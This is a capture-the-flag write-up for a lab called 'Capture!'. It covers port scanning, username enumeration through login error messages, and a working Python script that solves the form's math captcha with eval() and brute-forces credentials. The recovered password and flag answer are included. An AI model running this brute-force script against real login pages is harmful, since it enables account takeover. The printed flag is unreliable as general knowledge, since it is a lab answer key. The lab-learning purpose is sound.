# Capture!

SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly.

---

## Nmap

```bash
nmap -sV -p- -T4 <IP> -vv
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Werkzeug/2.2.2 Python/3.8.10
```

<img width="1847" height="963" alt="Screenshot From 2025-09-05 19-10-12" src="https://github.com/user-attachments/assets/9e161647-7470-4c46-8bbc-1a2138091751" />

---

## Web Enumeration

Going to the web page we get a login screen. SQL injections don’t work and we get back an error saying the user does not exist. But when you add a valid name like `billy`, you get a captcha enabled with a math question.

When you solve it, it doesn’t work. That means we’ll need a script!

---

## Script

This script was found online. Credit:
[https://github.com/l1asis/thm-writeups/blob/main/Capture/Capture.md](https://github.com/l1asis/thm-writeups/blob/main/Capture/Capture.md)

```python
import requests, re

url = "http://capture.thm/login"

with open("usernames.txt", "rt") as fd:
    usernames = fd.read().splitlines()

with open("passwords.txt", "rt") as fd:
    passwords = fd.read().splitlines()

regex = re.compile(r"(\d+\s[+*/-]\s\d+)\s\=\s\?")

def send_post(username, password, captcha=None):
    data = {
        "username":username,
        "password":password,
    }
    if captcha:
        data.update({"captcha":captcha})
    response = requests.post(url=url, data=data)
    return response

def solve_captcha(response):
    captcha = re.findall(regex, response.text)[0]
    return eval(captcha)

for count in range(100):
    response = send_post("darthvader", "lukesfather")
    try:
        captcha = solve_captcha(response)
        print(f"Captcha synchronised! Next solution is: {captcha}")
        break
    except:
        pass

for username in usernames:
    response = send_post(username, "None", captcha)
    captcha = solve_captcha(response)
    if not "does not exist" in response.text:
        for password in passwords:
            response = send_post(username, password, captcha)
            if not "Error" in response.text:
                print(f"Success! Username:{username} Password:{password}")
                exit(0)
            else:
                captcha = solve_captcha(response)
```

---

## Exploit Result

After running the script we get the password:

```bash
root@ip-10-201-62-217:~# python3 script.py 
Captcha synchronised! Next solution is: 459
Success! Username:natalie Password:sk8board
```

---

## Flag

Reading `flag.txt`:

```
7df2eabce36f02ca8ed7f237f77ea416
```

---

## Flag

> Q1: Flag
> A1: 7df2eabce36f02ca8ed7f237f77ea416
